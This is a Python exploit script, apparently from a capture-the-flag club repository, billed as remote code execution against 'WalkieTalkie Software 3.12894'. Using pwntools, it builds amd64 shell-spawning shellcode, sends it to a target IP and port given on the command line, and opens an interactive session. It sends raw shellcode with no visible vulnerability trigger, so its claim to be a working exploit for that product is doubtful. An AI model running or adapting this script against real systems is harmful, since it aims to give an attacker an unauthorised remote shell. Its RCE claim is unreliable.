'''
WalkieTalkie Software 3.12894 RCE
usage: python3 WalkieTalkie-Software-3.12894-RCE.py --ip <ip> --port <port>
https://github.com/RaynLight/WalkieTalkie-Software-3.12894-RCE
'''
import argparse
from pwn import *
import time

def exploit(ip, port):
        context.arch = 'amd64'
        # Create your shellcode
        shellcode = asm(shellcraft.sh())
        for x in range(100):
                time.sleep(40 / 1000)
                log.info("Offsec Club > CTF Club")
        log.info(f"Sending exploit {shellcode}")
        # sending exploit lol
        p = remote(ip, port)
        p.sendline(shellcode)
        p.interactive()


def main():
        parser = argparse.ArgumentParser()
        parser.add_argument('-i', '--ip', required=True, type=str, help='IP you are attacking')
        parser.add_argument('-p', '--port', required=True, type=int, help='Port you are attacking')
        args = parser.parse_args()
        ip = args.ip
        port = args.port
        exploit(ip, port)

if __name__ == '__main__':
    main()
            
